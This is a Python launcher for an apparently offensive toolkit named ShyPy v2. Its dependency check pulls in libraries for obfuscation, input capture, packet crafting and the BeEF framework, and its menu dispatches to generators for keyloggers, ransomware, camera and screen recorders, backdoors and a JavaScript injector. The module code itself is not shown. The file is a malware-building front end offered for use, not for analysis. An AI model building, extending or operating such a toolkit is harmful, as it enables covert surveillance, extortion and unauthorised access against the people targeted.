import platform
import os
import sys
from datetime import datetime
import itertools
import subprocess
import threading
import time

OS = platform.system().lower()

colors = {
    'BLACK': '\033[0;30m',
    'RED': '\033[0;31m',
    'GREEN': '\033[0;32m',
    'YELLOW': '\033[0;33m',
    'BLUE': '\033[0;34m',
    'MAGENTA': '\033[0;35m',
    'CYAN': '\033[0;36m',
    'WHITE': '\033[0;37m',
    'ZERO': '\033[0m'
}

class Shypy:
    def __init__(self):
        self.done = False
        self.required_modules = [
            'pyarmor', 'mouse', 'mouseinfo', 'pyautogui', 'scapy', 'pynput',
            'cryptography', 'simplejson', 'cv2',
        ]
        self.required_frameworks = [
            "beef-xss"
        ]

    def check_dependencies(self):
        missing_modules = [module for module in self.required_modules if not self.module_exists(module)]

        if missing_modules:
            self.done = True
            self.clear()
            print(f'{colors["YELLOW"]}[!]{colors["ZERO"]} One or more modules not found: {", ".join(missing_modules)}')
            print(f'{colors["BLUE"]}[?]{colors["ZERO"]} Do you want to install the requirements (Y/N): \n')

            ans = input(f"{colors['RED']}[ShyPy] => {colors['ZERO']} ").lower()

            if ans == "y":
                for module in missing_modules:
                    try:
                        subprocess.call(["pip", "install", f"{module}"])

                    except Exception as e:
                        self.done = True
                        print(f'{colors["YELLOW"]}[!]{colors["ZERO"]} Error: {str(e)}')
                        sys.exit(0)

            else:
                self.done = True
                self.clear()
                print(f"{colors['RED']}[X]{colors['ZERO']} Shypy will not run if the requirements are not installed..")
                sys.exit(0)
        else:
            self.done = True
            self.clear()
            print(f'{colors["GREEN"]}[✓]{colors["ZERO"]} Modules and requirements ready to use.\n')
            count = 0
            for s in itertools.cycle(['𓃉𓃉𓃉', '𓃉𓃉∘', '𓃉∘°', '∘°∘', '°∘𓃉', '∘𓃉𓃉', '𓃉𓃉𓃉', '𓃉𓃉∘', '𓃉∘°', '∘°∘', '°∘𓃉', '∘𓃉𓃉']):
                sys.stdout.write(f'\rStarting {s}')
                sys.stdout.flush()
                time.sleep(0.1)
                count += 1

                if count == 45:
                    break

            self.startup()

    def module_exists(self, module_name):
        try:
            __import__(module_name)
            return True
        
        except ImportError:
            return False

    def check(self):
        checked_modules = 0

        for c in itertools.cycle(["⢿", "⣻", "⣽", "⣾", "⣷", "⣯", "⣟", "⡿"]):
            if self.done:
                break

            sys.stdout.write(f'\r[{colors["CYAN"]} {c} {colors["ZERO"]}]|[{datetime.now().strftime("%Y-%M-%D %H:%M:%S")}]|[Being Checked.. {checked_modules}%]')
            sys.stdout.flush()
            time.sleep(0.1)
            checked_modules += 1

        sys.stdout.flush()

    def checkin(self):
        self.clear()
        try:
            t = threading.Thread(target=self.check)
            t.start()
            time.sleep(9.5)
            self.check_dependencies()

        except KeyboardInterrupt:
            self.done = True
            print(f'\n{colors["YELLOW"]}[!]{colors["ZERO"]} Process Terminated..')

    def startup(self):
        try:
            self.clear()
            print(f"""{colors["RED"]}      
████████████████████████████████████████████████████████████████████████████╗
╚══██╔══════════════════════════════════════════════════════════════════════╝
   ██║  ██╗  ██╗  ███████╗     ██████╗  ██╗  ██╗  ██╗  ██╗  ██████═╗ ██╗  ██╗ 
   ██║  ██╚══██║  ██╔════╝    ██╔════╝  ██╚══██║  ██╚══██║  ██╔══██║ ██╚══██║
   ██║  ███████║  ███████╗    ╚██████═╗ ███████║  ╚██████║  ██████╔╝ ╚██████║
   ██║  ██╔══██║  ██╔════╝     ╚════██║ ██╔══██║   ╚═══██║  ██╔═══╝   ╚══╗██║
   ██║  ██║  ██║  ███████╗    ███████╔╝ ██║  ██║  ██████╔╝  ██║          ║██║
   ╚═╝  ╚═╝  ╚═╝  ╚══════╝    ╚══════╝  ╚═╝  ╚═╝  ╚═════╝   ╚═╝         ╔███║ V2
   ████████████████████████████████████████████████████████████████████████╔╝
   ╚═══════════════════════════════════════════════════════════════════════╝\n""")
            
            ans = input('\t\t\t[Press "ENTER" To Continue]: ').lower()

            if ans == "":
                self.program_menu()

            else:
                self.startup()
        
        except (KeyboardInterrupt):
            self.clear()
            print(f'Signed Out Of The Shypy v2{colors["ZERO"]}')

    def program_menu(self):
        try:
            self.clear()
            print(f"""{colors['ZERO']}
            ╔════════════════════════╦══════════════════════╦════════════════════════╗
            ║* Version  :    V2     *║ Welcome To The ShyPy ║*                      *║
            ╠════════════════════════╩═════════╦════════════╩════════════════════════╣
            ║           Module Name            ║          Operating System           ║  
            ╠══════════════════════════════════╬═════════════════════════════════════╣
            ║[1] Keylogger Generator           :    [ Windows | Linux | Darwin ]     ║
            ║[2] Ransomware Generator          :    [ Windows | Linux | Darwin ]     ║
            ║[3] Camera Recorder Generator     :    [ Windows | Linux | Darwin ]     ║
            ║[4] Screen Recorder Generator     :    [ Windows | Linux | Darwin ]     ║   
            ║[5] Back Door Generator           :    [ Windows | Linux | Darwin ]     ║
            ║[6] Js Injector                   :    [         | Linux |        ]     ║
            ╠══════════════════════════════════╬═════════════════════════════════════╣
            ║ "use"                            : Used To Select Modules.             ║
            ║ "exit"                           : To Log Out Of ShyPy v2.             ║  
            ╠═════════════════════╦════════════╩═══════════════╦═════════════════════╣
            ║*                   *║ Developed by Atahan Poyraz ║*                   *║
            ╚═════════════════════╩════════════════════════════╩═════════════════════╝\n""")
        
            ans = input(f"{colors['RED']}[ShyPy] =>{colors['ZERO']} ").lower()

            if ans == "use 1" or ans == "use keylogger generator":
                from Modules.Keylogger_Generator.Keylogger_Generator import Generator
                gen = Generator()
                gen.start()
                
            elif ans == "use 2" or ans == "use ransomware generator":
                from Modules.Ransomware_Generator.Ransomware_Generator import RansomWare_Generator
                rg = RansomWare_Generator()
                rg.start()

            elif ans == "use 3" or ans == "use camera recorder":
                from Modules.Camera_Recorder.Camera_Recorder import Camera_Recorder
                camrec = Camera_Recorder()
                camrec.start()

            elif ans == "use 4" or ans == "user screen recorder":
                from Modules.Screen_Recorder.Screen_Recorder import Screen_Recorder
                screc = Screen_Recorder()
                screc.start()

            elif ans == "use 5" or ans == "use back door generator" or ans == "use backdoor generator":
                from Modules.BackDoor_Generator.BackDoor_Generator import Generator
                bckdoorgen = Generator()
                bckdoorgen.start()

            elif ans == "use 6" or ans == "use js injector":
                from Modules.JavaScript_Injector.Js_Injector import Js_Injector
                jsi = Js_Injector()
                jsi.start()

            elif ans == "exit":
                self.clear()
                print(f'Signed Out Of The Shypy v2{colors["ZERO"]}')

            else:
                print(f'{colors["YELLOW"]}[!]{colors["ZERO"]} Invalid Option')
                time.sleep(0.5)
                self.program_menu()

        except (KeyboardInterrupt):
            self.clear()
            print(f'Signed Out Of The Shypy v2{colors["ZERO"]}')

    def clear(self):
        if OS == "windows":
            os.system("cls")

        else:
            os.system("clear")

if __name__ == "__main__":
    shypy = Shypy()
    shypy.checkin()